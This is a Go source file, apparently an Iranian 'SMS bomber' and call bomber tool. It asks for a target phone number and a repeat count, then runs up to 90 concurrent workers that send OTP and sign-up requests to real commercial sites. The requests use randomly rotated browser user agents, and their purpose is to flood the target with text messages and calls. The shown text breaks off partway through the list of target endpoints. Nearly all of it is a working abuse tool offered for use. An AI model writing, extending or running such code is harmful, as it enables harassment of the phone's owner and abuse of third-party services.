/* coded by @monsmain
⚠️NOTE en:
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
*/
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"net/http/cookiejar"
	"math/rand" 
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.66",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.83",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133",
	"Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.58",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
}
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]


	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
        req.Header.Set("User-Agent", selectedUserAgent)


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p)
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {

	rand.Seed(time.Now().UnixNano())

	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
            .%@@#  @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-   irani    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+   #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m156 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms&call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*145)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*145)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
		
		
		// narsisbeauty.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("phone_number", phone) 
				formData.Set("wupp_remember_me", "on") 
				formData.Set("action", "wupp_sign_up") 
				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		//  toprayan.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("Step", "EnterMobile")
				formData.Set("Mobile", phone)
				formData.Set("Password", "")    
				formData.Set("RememberMe", "false")
				formData.Set("VerifyCode", "")
				formData.Set("X-Requested-With", "XMLHttpRequest")
				sendFormRequest(c, ctx, "https://toprayan.com/account/login", formData, &wg, ch)
			}
		}(client)
		//takdoo.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "ehraz_sms_otp_phone_verify")
				formData.Set("phone_number", phone) 
				formData.Set("login_method", "code")
				sendFormRequest(c, ctx, "https://takdoo.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)
		// irangan.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone) 
				formData.Set("email", "")   
				sendFormRequest(c, ctx, "https://www.irangan.com/account/Account/GetUserIdentity", formData, &wg, ch)
			}
		}(client)
		// oldpanel.avalpardakht.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
